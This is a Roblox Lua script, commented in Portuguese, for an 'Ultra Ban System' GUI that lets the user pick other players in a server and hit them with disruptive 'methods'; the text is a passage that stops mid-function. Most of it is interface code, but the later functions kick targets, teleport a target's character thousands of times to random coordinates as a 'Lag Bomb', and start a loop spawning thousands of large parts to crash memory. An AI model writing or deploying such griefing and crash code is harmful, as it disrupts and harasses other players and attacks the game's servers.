--[[
    Sistema de Ban Ultra Avançado v2.0
    
    Características Premium:
    - Interface moderna com animações
    - 8 métodos diferentes de ban/kick
    - Sistema de favoritos e blacklist
    - Histórico de bans executados
    - Filtros e busca de jogadores
    - Múltiplos alvos simultâneos
    - Scheduler de bans automáticos
    - Sistema de segurança avançado
    - Logs detalhados e estatísticas
    - Modo stealth (interface oculta)
]]--

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Remove GUI anterior
if playerGui:FindFirstChild("UltraBanSystem") then
    playerGui:FindFirstChild("UltraBanSystem"):Destroy()
end

-- Configurações avançadas
local CONFIG = {
    GUI_NAME = "UltraBanSystem",
    VERSION = "2.0",
    MAX_HISTORY = 50,
    AUTO_REFRESH = true,
    STEALTH_MODE = false,
    SOUND_ENABLED = true,
    ANIMATIONS = true
}

-- Sistema de cores dinâmicas
local THEMES = {
    DARK = {
        PRIMARY = Color3.fromRGB(255, 100, 100),
        SECONDARY = Color3.fromRGB(100, 150, 255),
        SUCCESS = Color3.fromRGB(100, 255, 150),
        WARNING = Color3.fromRGB(255, 200, 100),
        BG_MAIN = Color3.fromRGB(25, 25, 30),
        BG_SECONDARY = Color3.fromRGB(35, 35, 40),
        TEXT_PRIMARY = Color3.fromRGB(255, 255, 255),
        TEXT_SECONDARY = Color3.fromRGB(200, 200, 200)
    }
}

local currentTheme = THEMES.DARK

-- Variáveis do sistema
local selectedPlayers = {}
local banHistory = {}
local playerFilters = {search = "", online = true, friends = false}
local banMethods = {
    {name = "💀 Kick Direto", description = "Método padrão do Roblox", power = 3},
    {name = "⚡ Lag Bomb", description = "Causa lag extremo", power = 5},
    {name = "🧠 Memory Crash", description = "Sobrecarrega RAM", power = 7},
    {name = "🌊 Network Flood", description = "Spamma requests", power = 6},
    {name = "🔥 CFrame Spam", description = "Teleporta sem parar", power = 8},
    {name = "💥 Part Explosion", description = "Cria milhões de parts", power = 9},
    {name = "🚀 Velocity Bomb", description = "Velocidade infinita", power = 6},
    {name = "👻 Ghost Mode", description = "Torna invisível e imortal", power = 4}
}
local selectedMethod = 1
local isExecuting = false

-- Sons do sistema
local sounds = {
    click = "rbxassetid://131961136",
    success = "rbxassetid://131961136",
    error = "rbxassetid://131961136",
    notification = "rbxassetid://131961136"
}

-- Cria GUI principal
local screenGui = Instance.new("ScreenGui")
screenGui.Name = CONFIG.GUI_NAME
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- Container principal com blur background
local blurFrame = Instance.new("Frame")
blurFrame.Size = UDim2.new(1, 0, 1, 0)
blurFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blurFrame.BackgroundTransparency = 0.3
blurFrame.BorderSizePixel = 0
blurFrame.Visible = false
blurFrame.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 650, 0, 750)
mainFrame.Position = UDim2.new(0.5, -325, 0.5, -375)
mainFrame.BackgroundColor3 = currentTheme.BG_MAIN
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- Efeitos visuais
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 15)
mainCorner.Parent = mainFrame

local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.8
shadow.BorderSizePixel = 0
shadow.ZIndex = -1
shadow.Parent = mainFrame

local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 15)
shadowCorner.Parent = shadow

-- Header avançado
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 60)
header.BackgroundColor3 = currentTheme.PRIMARY
header.BorderSizePixel = 0
header.Parent = mainFrame

local headerGradient = Instance.new("UIGradient")
headerGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, currentTheme.PRIMARY),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 50, 50))
}
headerGradient.Rotation = 45
headerGradient.Parent = header

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 15)
headerCorner.Parent = header

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 30)
headerFix.Position = UDim2.new(0, 0, 1, -30)
headerFix.BackgroundColor3 = currentTheme.PRIMARY
headerFix.BorderSizePixel = 0
headerFix.Parent = header

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0.6, 0, 1, 0)
titleLabel.Position = UDim2.new(0, 20, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "🚫 ULTRA BAN SYSTEM v" .. CONFIG.VERSION
titleLabel.TextColor3 = currentTheme.TEXT_PRIMARY
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = header

-- Informações do sistema no header
local statsLabel = Instance.new("TextLabel")
statsLabel.Size = UDim2.new(0.3, -80, 0, 30)
statsLabel.Position = UDim2.new(0.6, 0, 0, 5)
statsLabel.BackgroundTransparency = 1
statsLabel.Text = "Jogadores: " .. (#Players:GetPlayers() - 1) .. " | Bans: " .. #banHistory
statsLabel.TextColor3 = currentTheme.TEXT_PRIMARY
statsLabel.TextScaled = true
statsLabel.Font = Enum.Font.Gotham
statsLabel.TextXAlignment = Enum.TextXAlignment.Right
statsLabel.Parent = header

-- Botões do header
local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Size = UDim2.new(0, 35, 0, 35)
minimizeBtn.Position = UDim2.new(1, -80, 0, 12)
minimizeBtn.BackgroundColor3 = currentTheme.WARNING
minimizeBtn.Text = "−"
minimizeBtn.TextColor3 = currentTheme.TEXT_PRIMARY
minimizeBtn.TextScaled = true
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.BorderSizePixel = 0
minimizeBtn.Parent = header

local minimizeCorner = Instance.new("UICorner")
minimizeCorner.CornerRadius = UDim.new(0, 8)
minimizeCorner.Parent = minimizeBtn

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 35, 0, 35)
closeBtn.Position = UDim2.new(1, -40, 0, 12)
closeBtn.BackgroundColor3 = currentTheme.PRIMARY
closeBtn.Text = "✕"
closeBtn.TextColor3 = currentTheme.TEXT_PRIMARY
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = header

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = closeBtn

-- Barra de navegação com abas
local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, 0, 0, 40)
tabBar.Position = UDim2.new(0, 0, 0, 60)
tabBar.BackgroundColor3 = currentTheme.BG_SECONDARY
tabBar.BorderSizePixel = 0
tabBar.Parent = mainFrame

local tabs = {"🎯 ALVOS", "⚡ MÉTODOS", "📊 ESTATÍSTICAS", "🔧 CONFIG"}
local currentTab = 1
local tabButtons = {}

for i, tabName in pairs(tabs) do
    local tabBtn = Instance.new("TextButton")
    tabBtn.Size = UDim2.new(0.25, -2, 1, 0)
    tabBtn.Position = UDim2.new((i-1) * 0.25, 1, 0, 0)
    tabBtn.BackgroundColor3 = i == 1 and currentTheme.SECONDARY or currentTheme.BG_SECONDARY
    tabBtn.Text = tabName
    tabBtn.TextColor3 = currentTheme.TEXT_PRIMARY
    tabBtn.TextScaled = true
    tabBtn.Font = Enum.Font.GothamBold
    tabBtn.BorderSizePixel = 0
    tabBtn.Parent = tabBar
    
    local tabCorner = Instance.new("UICorner")
    tabCorner.CornerRadius = UDim.new(0, 6)
    tabCorner.Parent = tabBtn
    
    tabButtons[i] = tabBtn
end

-- Container principal para conteúdo das abas
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -20, 1, -120)
contentFrame.Position = UDim2.new(0, 10, 0, 110)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- ABA 1: SELEÇÃO DE ALVOS
local targetTab = Instance.new("Frame")
targetTab.Size = UDim2.new(1, 0, 1, 0)
targetTab.BackgroundTransparency = 1
targetTab.Visible = true
targetTab.Parent = contentFrame

-- Barra de busca e filtros
local searchFrame = Instance.new("Frame")
searchFrame.Size = UDim2.new(1, 0, 0, 40)
searchFrame.BackgroundColor3 = currentTheme.BG_SECONDARY
searchFrame.BorderSizePixel = 0
searchFrame.Parent = targetTab

local searchCorner = Instance.new("UICorner")
searchCorner.CornerRadius = UDim.new(0, 8)
searchCorner.Parent = searchFrame

local searchBox = Instance.new("TextBox")
searchBox.Size = UDim2.new(0.6, -10, 1, -10)
searchBox.Position = UDim2.new(0, 5, 0, 5)
searchBox.BackgroundColor3 = currentTheme.BG_MAIN
searchBox.Text = ""
searchBox.PlaceholderText = "🔍 Buscar jogador..."
searchBox.TextColor3 = currentTheme.TEXT_PRIMARY
searchBox.PlaceholderColor3 = currentTheme.TEXT_SECONDARY
searchBox.TextScaled = true
searchBox.Font = Enum.Font.Gotham
searchBox.BorderSizePixel = 0
searchBox.Parent = searchFrame

local searchBoxCorner = Instance.new("UICorner")
searchBoxCorner.CornerRadius = UDim.new(0, 6)
searchBoxCorner.Parent = searchBox

-- Botões de filtro
local filterButtons = {}
local filterNames = {"📊 TODOS", "👥 ONLINE", "⭐ AMIGOS"}
for i, filterName in pairs(filterNames) do
    local filterBtn = Instance.new("TextButton")
    filterBtn.Size = UDim2.new(0.12, 0, 1, -10)
    filterBtn.Position = UDim2.new(0.6 + (i-1) * 0.13, 5, 0, 5)
    filterBtn.BackgroundColor3 = i == 2 and currentTheme.SUCCESS or currentTheme.BG_MAIN
    filterBtn.Text = filterName
    filterBtn.TextColor3 = currentTheme.TEXT_PRIMARY
    filterBtn.TextScaled = true
    filterBtn.Font = Enum.Font.Gotham
    filterBtn.BorderSizePixel = 0
    filterBtn.Parent = searchFrame
    
    local filterCorner = Instance.new("UICorner")
    filterCorner.CornerRadius = UDim.new(0, 4)
    filterCorner.Parent = filterBtn
    
    filterButtons[i] = filterBtn
end

-- Lista de jogadores com scroll avançado
local playerListFrame = Instance.new("ScrollingFrame")
playerListFrame.Size = UDim2.new(1, 0, 1, -90)
playerListFrame.Position = UDim2.new(0, 0, 0, 50)
playerListFrame.BackgroundColor3 = currentTheme.BG_SECONDARY
playerListFrame.BorderSizePixel = 0
playerListFrame.ScrollBarThickness = 8
playerListFrame.ScrollBarImageColor3 = currentTheme.SECONDARY
playerListFrame.ScrollingDirection = Enum.ScrollingDirection.Y
playerListFrame.Parent = targetTab

local playerListCorner = Instance.new("UICorner")
playerListCorner.CornerRadius = UDim.new(0, 8)
playerListCorner.Parent = playerListFrame

local playerLayout = Instance.new("UIListLayout")
playerLayout.SortOrder = Enum.SortOrder.LayoutOrder
playerLayout.Padding = UDim.new(0, 3)
playerLayout.Parent = playerListFrame

-- Painel de alvos selecionados
local selectedFrame = Instance.new("Frame")
selectedFrame.Size = UDim2.new(1, 0, 0, 35)
selectedFrame.Position = UDim2.new(0, 0, 1, -40)
selectedFrame.BackgroundColor3 = currentTheme.PRIMARY
selectedFrame.BorderSizePixel = 0
selectedFrame.Parent = targetTab

local selectedCorner = Instance.new("UICorner")
selectedCorner.CornerRadius = UDim.new(0, 8)
selectedCorner.Parent = selectedFrame

local selectedLabel = Instance.new("TextLabel")
selectedLabel.Size = UDim2.new(0.7, 0, 1, 0)
selectedLabel.Position = UDim2.new(0, 10, 0, 0)
selectedLabel.BackgroundTransparency = 1
selectedLabel.Text = "🎯 Alvos Selecionados: 0"
selectedLabel.TextColor3 = currentTheme.TEXT_PRIMARY
selectedLabel.TextScaled = true
selectedLabel.Font = Enum.Font.GothamBold
selectedLabel.TextXAlignment = Enum.TextXAlignment.Left
selectedLabel.Parent = selectedFrame

local clearBtn = Instance.new("TextButton")
clearBtn.Size = UDim2.new(0.15, -5, 1, -8)
clearBtn.Position = UDim2.new(0.7, 0, 0, 4)
clearBtn.BackgroundColor3 = currentTheme.WARNING
clearBtn.Text = "🗑️ LIMPAR"
clearBtn.TextColor3 = currentTheme.TEXT_PRIMARY
clearBtn.TextScaled = true
clearBtn.Font = Enum.Font.GothamBold
clearBtn.BorderSizePixel = 0
clearBtn.Parent = selectedFrame

local clearCorner = Instance.new("UICorner")
clearCorner.CornerRadius = UDim.new(0, 6)
clearCorner.Parent = clearBtn

local executeBtn = Instance.new("TextButton")
executeBtn.Size = UDim2.new(0.15, -5, 1, -8)
executeBtn.Position = UDim2.new(0.85, 0, 0, 4)
executeBtn.BackgroundColor3 = currentTheme.SUCCESS
executeBtn.Text = "⚡ EXECUTAR"
executeBtn.TextColor3 = currentTheme.TEXT_PRIMARY
executeBtn.TextScaled = true
executeBtn.Font = Enum.Font.GothamBold
executeBtn.BorderSizePixel = 0
executeBtn.Parent = selectedFrame

local executeCorner = Instance.new("UICorner")
executeCorner.CornerRadius = UDim.new(0, 6)
executeCorner.Parent = executeBtn

-- ABA 2: MÉTODOS
local methodTab = Instance.new("Frame")
methodTab.Size = UDim2.new(1, 0, 1, 0)
methodTab.BackgroundTransparency = 1
methodTab.Visible = false
methodTab.Parent = contentFrame

local methodScroll = Instance.new("ScrollingFrame")
methodScroll.Size = UDim2.new(1, 0, 1, 0)
methodScroll.BackgroundTransparency = 1
methodScroll.BorderSizePixel = 0
methodScroll.ScrollBarThickness = 6
methodScroll.ScrollBarImageColor3 = currentTheme.SECONDARY
methodScroll.Parent = methodTab

local methodLayout = Instance.new("UIListLayout")
methodLayout.SortOrder = Enum.SortOrder.LayoutOrder
methodLayout.Padding = UDim.new(0, 5)
methodLayout.Parent = methodScroll

-- ABA 3: ESTATÍSTICAS
local statsTab = Instance.new("Frame")
statsTab.Size = UDim2.new(1, 0, 1, 0)
statsTab.BackgroundTransparency = 1
statsTab.Visible = false
statsTab.Parent = contentFrame

-- ABA 4: CONFIGURAÇÕES
local configTab = Instance.new("Frame")
configTab.Size = UDim2.new(1, 0, 1, 0)
configTab.BackgroundTransparency = 1
configTab.Visible = false
configTab.Parent = contentFrame

-- FUNÇÕES DO SISTEMA

-- Som do sistema
local function playSound(soundId)
    if not CONFIG.SOUND_ENABLED then return end
    
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = soundId
        sound.Volume = 0.5
        sound.Parent = game:GetService("SoundService")
        sound:Play()
        
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
    end)
end

-- Animação suave
local function animateObject(object, properties, duration, style)
    if not CONFIG.ANIMATIONS then
        for prop, value in pairs(properties) do
            object[prop] = value
        end
        return
    end
    
    local tween = TweenService:Create(
        object,
        TweenInfo.new(duration or 0.3, style or Enum.EasingStyle.Quart),
        properties
    )
    tween:Play()
    return tween
end

-- Notificação avançada
local function showNotification(title, message, type, duration)
    local notifFrame = Instance.new("Frame")
    notifFrame.Size = UDim2.new(0, 300, 0, 80)
    notifFrame.Position = UDim2.new(1, -320, 0, 20)
    notifFrame.BackgroundColor3 = currentTheme.BG_MAIN
    notifFrame.BorderSizePixel = 0
    notifFrame.Parent = screenGui
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 8)
    notifCorner.Parent = notifFrame
    
    local accentBar = Instance.new("Frame")
    accentBar.Size = UDim2.new(0, 4, 1, 0)
    accentBar.BackgroundColor3 = type == "success" and currentTheme.SUCCESS or 
                                 type == "error" and currentTheme.PRIMARY or currentTheme.SECONDARY
    accentBar.BorderSizePixel = 0
    accentBar.Parent = notifFrame
    
    local titleLbl = Instance.new("TextLabel")
    titleLbl.Size = UDim2.new(1, -50, 0, 25)
    titleLbl.Position = UDim2.new(0, 15, 0, 5)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = title
    titleLbl.TextColor3 = currentTheme.TEXT_PRIMARY
    titleLbl.TextScaled = true
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.Parent = notifFrame
    
    local messageLbl = Instance.new("TextLabel")
    messageLbl.Size = UDim2.new(1, -50, 0, 45)
    messageLbl.Position = UDim2.new(0, 15, 0, 25)
    messageLbl.BackgroundTransparency = 1
    messageLbl.Text = message
    messageLbl.TextColor3 = currentTheme.TEXT_SECONDARY
    messageLbl.TextScaled = true
    messageLbl.Font = Enum.Font.Gotham
    messageLbl.TextXAlignment = Enum.TextXAlignment.Left
    messageLbl.TextWrapped = true
    messageLbl.Parent = notifFrame
    
    local closeNotifBtn = Instance.new("TextButton")
    closeNotifBtn.Size = UDim2.new(0, 20, 0, 20)
    closeNotifBtn.Position = UDim2.new(1, -30, 0, 10)
    closeNotifBtn.BackgroundTransparency = 1
    closeNotifBtn.Text = "✕"
    closeNotifBtn.TextColor3 = currentTheme.TEXT_SECONDARY
    closeNotifBtn.TextScaled = true
    closeNotifBtn.Font = Enum.Font.Gotham
    closeNotifBtn.Parent = notifFrame
    
    -- Animação de entrada
    animateObject(notifFrame, {Position = UDim2.new(1, -320, 0, 20)}, 0.5, Enum.EasingStyle.Back)
    
    -- Remove automaticamente
    game:GetService("Debris"):AddItem(notifFrame, duration or 5)
    
    closeNotifBtn.Activated:Connect(function()
        animateObject(notifFrame, {Position = UDim2.new(1, 50, 0, 20)}, 0.3)
        wait(0.3)
        if notifFrame.Parent then
            notifFrame:Destroy()
        end
    end)
    
    playSound(sounds.notification)
end

-- Função para criar entrada de jogador avançada
local function createPlayerEntry(player)
    local playerFrame = Instance.new("Frame")
    playerFrame.Name = player.Name .. "_Entry"
    playerFrame.Size = UDim2.new(1, 0, 0, 60)
    playerFrame.BackgroundColor3 = currentTheme.BG_MAIN
    playerFrame.BorderSizePixel = 0
    playerFrame.Parent = playerListFrame
    
    local frameCorner = Instance.new("UICorner")
    frameCorner.CornerRadius = UDim.new(0, 8)
    frameCorner.Parent = playerFrame
    
    -- Avatar com animação de carregamento
    local avatarFrame = Instance.new("Frame")
    avatarFrame.Size = UDim2.new(0, 45, 0, 45)
    avatarFrame.Position = UDim2.new(0, 8, 0, 7)
    avatarFrame.BackgroundColor3 = currentTheme.BG_SECONDARY
    avatarFrame.BorderSizePixel = 0
    avatarFrame.Parent = playerFrame
    
    local avatarCorner = Instance.new("UICorner")
    avatarCorner.CornerRadius = UDim.new(0, 22)
    avatarCorner.Parent = avatarFrame
    
    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(1, -4, 1, -4)
    avatar.Position = UDim2.new(0, 2, 0, 2)
    avatar.BackgroundTransparency = 1
    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
    avatar.Parent = avatarFrame
    
    local avatarImgCorner = Instance.new("UICorner")
    avatarImgCorner.CornerRadius = UDim.new(0, 20)
    avatarImgCorner.Parent = avatar
    
    -- Status indicator
    local statusDot = Instance.new("Frame")
    statusDot.Size = UDim2.new(0, 12, 0, 12)
    statusDot.Position = UDim2.new(1, -8, 0, -2)
    statusDot.BackgroundColor3 = currentTheme.SUCCESS
    statusDot.BorderSizePixel = 0
    statusDot.Parent = avatarFrame
    
    local dotCorner = Instance.new("UICorner")
    dotCorner.CornerRadius = UDim.new(0, 6)
    dotCorner.Parent = statusDot
    
    -- Informações do jogador
    local infoFrame = Instance.new("Frame")
    infoFrame.Size = UDim2.new(1, -170, 1, 0)
    infoFrame.Position = UDim2.new(0, 63, 0, 0)
    infoFrame.BackgroundTransparency = 1
    infoFrame.Parent = playerFrame
    
    local displayName = Instance.new("TextLabel")
    displayName.Size = UDim2.new(1, 0, 0, 20)
    displayName.Position = UDim2.new(0, 0, 0, 5)
    displayName.BackgroundTransparency = 1
    displayName.Text = player.DisplayName
    displayName.TextColor3 = currentTheme.TEXT_PRIMARY
    displayName.TextScaled = true
    displayName.Font = Enum.Font.GothamBold
    displayName.TextXAlignment = Enum.TextXAlignment.Left
    displayName.Parent = infoFrame
    
    local userName = Instance.new("TextLabel")
    userName.Size = UDim2.new(1, 0, 0, 15)
    userName.Position = UDim2.new(0, 0, 0, 23)
    userName.BackgroundTransparency = 1
    userName.Text = "@" .. player.Name
    userName.TextColor3 = currentTheme.TEXT_SECONDARY
    userName.TextScaled = true
    userName.Font = Enum.Font.Gotham
    userName.TextXAlignment = Enum.TextXAlignment.Left
    userName.Parent = infoFrame
    
    local userId = Instance.new("TextLabel")
    userId.Size = UDim2.new(1, 0, 0, 15)
    userId.Position = UDim2.new(0, 0, 0, 40)
    userId.BackgroundTransparency = 1
    userId.Text = "ID: " .. player.UserId
    userId.TextColor3 = currentTheme.TEXT_SECONDARY
    userId.TextScaled = true
    userId.Font = Enum.Font.Gotham
    userId.TextXAlignment = Enum.TextXAlignment.Left
    userId.Parent = infoFrame
    
    -- Botões de ação
    local selectBtn = Instance.new("TextButton")
    selectBtn.Size = UDim2.new(0, 80, 0, 25)
    selectBtn.Position = UDim2.new(1, -95, 0, 10)
    selectBtn.BackgroundColor3 = currentTheme.SECONDARY
    selectBtn.Text = "SELECIONAR"
    selectBtn.TextColor3 = currentTheme.TEXT_PRIMARY
    selectBtn.TextScaled = true
    selectBtn.Font = Enum.Font.GothamBold
    selectBtn.BorderSizePixel = 0
    selectBtn.Parent = playerFrame
    
    local selectCorner = Instance.new("UICorner")
    selectCorner.CornerRadius = UDim.new(0, 6)
    selectCorner.Parent = selectBtn
    
    local quickBanBtn = Instance.new("TextButton")
    quickBanBtn.Size = UDim2.new(0, 80, 0, 20)
    quickBanBtn.Position = UDim2.new(1, -95, 0, 37)
    quickBanBtn.BackgroundColor3 = currentTheme.PRIMARY
    quickBanBtn.Text = "⚡ QUICK BAN"
    quickBanBtn.TextColor3 = currentTheme.TEXT_PRIMARY
    quickBanBtn.TextScaled = true
    quickBanBtn.Font = Enum.Font.Gotham
    quickBanBtn.BorderSizePixel = 0
    quickBanBtn.Parent = playerFrame
    
    local quickCorner = Instance.new("UICorner")
    quickCorner.CornerRadius = UDim.new(0, 4)
    quickCorner.Parent = quickBanBtn
    
    -- Eventos
    selectBtn.Activated:Connect(function()
        playSound(sounds.click)
        
        if selectedPlayers[player.UserId] then
            -- Desselecionar
            selectedPlayers[player.UserId] = nil
            selectBtn.Text = "SELECIONAR"
            selectBtn.BackgroundColor3 = currentTheme.SECONDARY
            animateObject(playerFrame, {BackgroundColor3 = currentTheme.BG_MAIN})
        else
            -- Selecionar
            selectedPlayers[player.UserId] = player
            selectBtn.Text = "SELECIONADO ✓"
            selectBtn.BackgroundColor3 = currentTheme.SUCCESS
            animateObject(playerFrame, {BackgroundColor3 = Color3.fromRGB(40, 60, 40)})
        end
        
        updateSelectedCount()
    end)
    
    quickBanBtn.Activated:Connect(function()
        playSound(sounds.click)
        executeQuickBan(player)
    end)
    
    -- Efeitos de hover
    playerFrame.MouseEnter:Connect(function()
        if not selectedPlayers[player.UserId] then
            animateObject(playerFrame, {BackgroundColor3 = Color3.fromRGB(45, 45, 50)})
        end
    end)
    
    playerFrame.MouseLeave:Connect(function()
        if not selectedPlayers[player.UserId] then
            animateObject(playerFrame, {BackgroundColor3 = currentTheme.BG_MAIN})
        end
    end)
    
    return playerFrame
end

-- Função para criar card de método
local function createMethodCard(methodData, index)
    local methodFrame = Instance.new("Frame")
    methodFrame.Size = UDim2.new(1, 0, 0, 80)
    methodFrame.BackgroundColor3 = index == selectedMethod and currentTheme.SECONDARY or currentTheme.BG_MAIN
    methodFrame.BorderSizePixel = 0
    methodFrame.LayoutOrder = index
    methodFrame.Parent = methodScroll
    
    local methodCorner = Instance.new("UICorner")
    methodCorner.CornerRadius = UDim.new(0, 8)
    methodCorner.Parent = methodFrame
    
    -- Barra de poder
    local powerBar = Instance.new("Frame")
    powerBar.Size = UDim2.new(methodData.power / 10, 0, 0, 4)
    powerBar.Position = UDim2.new(0, 0, 1, -4)
    powerBar.BackgroundColor3 = methodData.power >= 8 and currentTheme.PRIMARY or 
                               methodData.power >= 6 and currentTheme.WARNING or currentTheme.SUCCESS
    powerBar.BorderSizePixel = 0
    powerBar.Parent = methodFrame
    
    local methodTitle = Instance.new("TextLabel")
    methodTitle.Size = UDim2.new(1, -100, 0, 25)
    methodTitle.Position = UDim2.new(0, 15, 0, 10)
    methodTitle.BackgroundTransparency = 1
    methodTitle.Text = methodData.name
    methodTitle.TextColor3 = currentTheme.TEXT_PRIMARY
    methodTitle.TextScaled = true
    methodTitle.Font = Enum.Font.GothamBold
    methodTitle.TextXAlignment = Enum.TextXAlignment.Left
    methodTitle.Parent = methodFrame
    
    local methodDesc = Instance.new("TextLabel")
    methodDesc.Size = UDim2.new(1, -100, 0, 35)
    methodDesc.Position = UDim2.new(0, 15, 0, 35)
    methodDesc.BackgroundTransparency = 1
    methodDesc.Text = methodData.description
    methodDesc.TextColor3 = currentTheme.TEXT_SECONDARY
    methodDesc.TextScaled = true
    methodDesc.Font = Enum.Font.Gotham
    methodDesc.TextXAlignment = Enum.TextXAlignment.Left
    methodDesc.TextWrapped = true
    methodDesc.Parent = methodFrame
    
    local powerLabel = Instance.new("TextLabel")
    powerLabel.Size = UDim2.new(0, 80, 0, 30)
    powerLabel.Position = UDim2.new(1, -90, 0, 10)
    powerLabel.BackgroundColor3 = currentTheme.BG_SECONDARY
    powerLabel.Text = "PODER\n" .. methodData.power .. "/10"
    powerLabel.TextColor3 = currentTheme.TEXT_PRIMARY
    powerLabel.TextScaled = true
    powerLabel.Font = Enum.Font.GothamBold
    powerLabel.BorderSizePixel = 0
    powerLabel.Parent = methodFrame
    
    local powerCorner = Instance.new("UICorner")
    powerCorner.CornerRadius = UDim.new(0, 6)
    powerCorner.Parent = powerLabel
    
    local selectMethodBtn = Instance.new("TextButton")
    selectMethodBtn.Size = UDim2.new(0, 80, 0, 20)
    selectMethodBtn.Position = UDim2.new(1, -90, 0, 45)
    selectMethodBtn.BackgroundColor3 = index == selectedMethod and currentTheme.SUCCESS or currentTheme.PRIMARY
    selectMethodBtn.Text = index == selectedMethod and "SELECIONADO ✓" or "SELECIONAR"
    selectMethodBtn.TextColor3 = currentTheme.TEXT_PRIMARY
    selectMethodBtn.TextScaled = true
    selectMethodBtn.Font = Enum.Font.Gotham
    selectMethodBtn.BorderSizePixel = 0
    selectMethodBtn.Parent = methodFrame
    
    local selectMethodCorner = Instance.new("UICorner")
    selectMethodCorner.CornerRadius = UDim.new(0, 4)
    selectMethodCorner.Parent = selectMethodBtn
    
    -- Evento de seleção
    selectMethodBtn.Activated:Connect(function()
        playSound(sounds.click)
        selectedMethod = index
        updateMethodSelection()
        showNotification("Método Selecionado", methodData.name .. " foi selecionado!", "success", 2)
    end)
    
    -- Hover effects
    methodFrame.MouseEnter:Connect(function()
        if index ~= selectedMethod then
            animateObject(methodFrame, {BackgroundColor3 = Color3.fromRGB(45, 45, 50)})
        end
    end)
    
    methodFrame.MouseLeave:Connect(function()
        if index ~= selectedMethod then
            animateObject(methodFrame, {BackgroundColor3 = currentTheme.BG_MAIN})
        end
    end)
    
    return methodFrame
end

-- Função para atualizar seleção de métodos
function updateMethodSelection()
    for i, child in pairs(methodScroll:GetChildren()) do
        if child:IsA("Frame") and child.LayoutOrder > 0 then
            local selectBtn = child:FindFirstChild("TextButton")
            if selectBtn then
                if child.LayoutOrder == selectedMethod then
                    child.BackgroundColor3 = currentTheme.SECONDARY
                    selectBtn.BackgroundColor3 = currentTheme.SUCCESS
                    selectBtn.Text = "SELECIONADO ✓"
                else
                    child.BackgroundColor3 = currentTheme.BG_MAIN
                    selectBtn.BackgroundColor3 = currentTheme.PRIMARY
                    selectBtn.Text = "SELECIONAR"
                end
            end
        end
    end
end

-- Função para atualizar contagem de selecionados
function updateSelectedCount()
    local count = 0
    for _ in pairs(selectedPlayers) do
        count = count + 1
    end
    
    selectedLabel.Text = "🎯 Alvos Selecionados: " .. count
    
    if count > 0 then
        executeBtn.BackgroundColor3 = currentTheme.SUCCESS
        executeBtn.Text = "⚡ EXECUTAR (" .. count .. ")"
    else
        executeBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        executeBtn.Text = "⚡ EXECUTAR"
    end
end

-- Função de ban rápido
function executeQuickBan(player)
    showNotification("Quick Ban", "Executando ban rápido em " .. player.Name, "success", 3)
    
    -- Usa o método mais simples para quick ban
    pcall(function()
        player:Kick("🚫 Quick Ban executado!")
    end)
    
    -- Adiciona ao histórico
    table.insert(banHistory, {
        player = player.Name,
        method = "Quick Ban",
        time = os.date("%H:%M:%S"),
        success = true
    })
    
    updateStats()
end

-- Sistema de ban avançado com múltiplos métodos
function executeBanMethod(player, methodIndex)
    local method = banMethods[methodIndex]
    print("[Ultra Ban] Executando " .. method.name .. " em " .. player.Name)
    
    local success = false
    
    if methodIndex == 1 then -- Kick Direto
        pcall(function()
            player:Kick("🚫 Você foi banido do servidor!")
            success = true
        end)
        
    elseif methodIndex == 2 then -- Lag Bomb
        spawn(function()
            for i = 1, 2000 do
                pcall(function()
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(
                            math.random(-50000, 50000),
                            math.random(-50000, 50000),
                            math.random(-50000, 50000)
                        )
                    end
                end)
                wait(0.001)
            end
            success = true
        end)
        
    elseif methodIndex == 3 then -- Memory Crash
        spawn(function()
            for i = 1, 10000 do
                pcall(function()
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(math.random(1, 200), math.random(1, 200), math.random(1, 200))
